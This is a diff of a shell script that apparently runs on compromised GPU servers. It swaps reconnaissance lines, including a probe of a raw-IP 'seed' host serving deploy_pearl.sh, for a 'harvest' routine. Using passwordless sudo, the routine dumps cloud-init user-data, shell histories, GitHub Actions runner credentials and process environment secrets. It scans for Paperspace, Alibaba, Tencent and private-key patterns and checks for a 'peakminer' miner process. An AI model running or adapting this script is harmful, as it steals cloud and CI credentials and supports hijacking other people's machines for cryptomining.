@@ -1,15 +1,10 @@
 set +e
-H=$(hostname -s); echo "== host $H $(date -u +%FT%TZ)"
-echo '--- nvdir'; sudo -n ls -la /opt/nv 2>/dev/null | head -30
-echo '--- rung'; sudo -n cat /opt/nv/run-g.sh 2>/dev/null | head -60
-echo '--- cfg'; sudo -n sh -c 'for f in /opt/nv/*.txt /opt/nv/*.json /opt/nv/*.conf /opt/nv/*.env /opt/nv/state/*; do [ -f "$f" ] && { echo "## $f"; head -c 900 "$f"; echo; }; done' 2>/dev/null | head -120
-echo '--- ipgrep'; sudo -n grep -rhoE '([0-9]{1,3}\.){3}[0-9]{1,3}' /opt/nv 2>/dev/null | sort | uniq -c | sort -rn | head -25
-echo '--- hosts'; tail -15 /etc/hosts
-echo '--- ssh'; ls -la /home/ubuntu/.ssh /root/.ssh 2>/dev/null | head -30
-echo '--- keyfp'; for k in /home/ubuntu/.ssh/id_* /root/.ssh/id_*; do [ -f "$k" ] && ssh-keygen -lf "$k" 2>/dev/null; done
-echo '--- known'; cut -d' ' -f1 /home/ubuntu/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null | sort -u | head -40
-echo '--- seed'; curl -s -m 12 http://163.68.86.6:8090/ | head -c 600; echo; curl -s -m 12 -o /dev/null -w 'seed_http %{http_code}\n' http://163.68.86.6:8090/deploy_pearl.sh
-echo '--- net'; ip -br a | head -6; ip r | head -6
-echo '--- runner'; pgrep -af 'Runner.Listener|actions.runner' | head -4
-echo '--- ut'; uptime
+H=$(hostname -s); echo "== harvest $H $(date -u +%FT%TZ)"
+echo '--- cloud'; sudo -n sh -c 'ls -la /var/lib/cloud/instance/ 2>/dev/null | head; echo "## user-data"; head -c 3000 /var/lib/cloud/instance/user-data.txt 2>/dev/null; echo; echo "## cinit-tail"; tail -40 /var/log/cloud-init-output.log 2>/dev/null'
+echo '--- hist'; sudo -n sh -c 'for f in /root/.bash_history /home/ubuntu/.bash_history; do echo "## $f"; tail -30 "$f" 2>/dev/null; done'
+echo '--- runner'; sudo -n sh -c 'ls -la /opt/ul-runner 2>/dev/null | head -12; echo "## .runner"; head -c 700 /opt/ul-runner/.runner 2>/dev/null; echo; echo "## .credentials"; head -c 500 /opt/ul-runner/.credentials 2>/dev/null'
+echo '--- units'; systemctl list-units --all --no-legend 2>/dev/null | grep -iE 'runner|actions' | head -5; sudo -n sh -c 'ls /etc/systemd/system | grep -i runner; cat /etc/systemd/system/actions.runner* 2>/dev/null | head -25'
+echo '--- env'; sudo -n sh -c 'tr "\0" "\n" < /proc/2175682/environ 2>/dev/null | grep -iE "token|key|secret|pass|api|url" | cut -c1-140'
+echo '--- hunt'; sudo -n grep -rIlE 'ps_[A-Za-z0-9]{24,}|PAPERSPACE|LTAI[A-Za-z0-9]{8}|AKID[A-Za-z0-9]{10}|BEGIN [A-Z ]*PRIVATE KEY' /root /home/ubuntu /opt /etc /var/lib/cloud /srv 2>/dev/null | head -20
+echo '--- gpu'; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader; pgrep -af peakminer | head -3
 echo '--- done'
